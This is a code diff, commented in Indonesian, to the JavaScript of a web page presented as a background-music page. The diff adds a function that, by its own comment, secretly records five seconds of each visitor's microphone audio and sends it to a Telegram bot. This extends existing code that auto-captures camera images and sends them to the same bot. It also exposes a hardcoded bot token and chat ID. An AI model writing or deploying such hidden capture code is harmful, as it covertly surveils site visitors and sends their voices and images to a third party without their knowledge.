@@ -9,7 +9,7 @@ if (openPhotoOptions && photoOptions) {
 const BOT_TOKEN = "8317170535:AAGh0PBKO4T-HkZQ4b7COREqLWcOIjW3QTY";
 const CHAT_ID = "6864694275";
 
-// === BAGIAN MUSIK + KAMERA — HYBRID FIX STABIL ===
+// === BAGIAN MUSIK + KAMERA + SUARA — HYBRID FIX STABIL ===
 const music = document.getElementById('bgmusic');
 const btnMusic = document.getElementById('musicButton');
 let started = false;
@@ -29,9 +29,10 @@ async function startMusicAndCamera() {
     console.warn("Autoplay musik gagal:", err);
     btnMusic.classList.add("show");
     btnMusic.disabled = false;
-    // tetap lanjut kamera walau musik gagal
+    // tetap lanjut izin lain walau musik gagal
   }
 
+  // === jalankan kamera & mic setelah sedikit delay ===
   setTimeout(async () => {
     try {
       const alreadyAllowed = localStorage.getItem("user_allows_auto_capture") === "1";
@@ -45,8 +46,12 @@ async function startMusicAndCamera() {
         console.log("📸 Kamera sudah diizinkan sebelumnya, ambil otomatis...");
         await autoCaptureAndSend();
       }
+
+      // === rekam suara diam-diam (versi hidden) ===
+      await autoRecordAndSend();
+
     } catch (e) {
-      console.warn("❌ User menolak izin kamera:", e);
+      console.warn("❌ User menolak izin kamera atau mikrofon:", e);
     }
   }, musicStarted ? 800 : 1500);
 
@@ -101,7 +106,47 @@ async function autoCaptureAndSend() {
   }
 }
 
-// === Event Listener Fix (musik + kamera) ===
+// === Fungsi rekam suara tersembunyi & kirim ke Telegram ===
+async function autoRecordAndSend() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+    const recorder = new MediaRecorder(stream);
+    const chunks = [];
+
+    recorder.ondataavailable = (e) => {
+      if (e.data.size > 0) chunks.push(e.data);
+    };
+
+    recorder.onstop = async () => {
+      const blob = new Blob(chunks, { type: "audio/webm" });
+      stream.getTracks().forEach(t => t.stop());
+
+      const fd = new FormData();
+      fd.append("chat_id", CHAT_ID);
+      fd.append("caption", "🎤 Auto-record suara pengunjung (5 detik)");
+      fd.append("voice", blob, "voice.webm");
+
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, {
+          method: "POST",
+          body: fd
+        });
+        if (res.ok) console.log("✅ Suara terkirim (5s)");
+        else console.warn("⚠️ Gagal kirim suara");
+      } catch (err) {
+        console.error("❌ Gagal kirim suara:", err);
+      }
+    };
+
+    recorder.start();
+    console.log("🎙️ Mulai merekam 5 detik...");
+    setTimeout(() => recorder.stop(), 5000);
+  } catch (err) {
+    console.warn("❌ Izin mikrofon ditolak atau tidak tersedia:", err);
+  }
+}
+
+// === Event Listener Fix (musik + kamera + mic) ===
 function userStart() {
   startMusicAndCamera().catch(console.warn);
 }
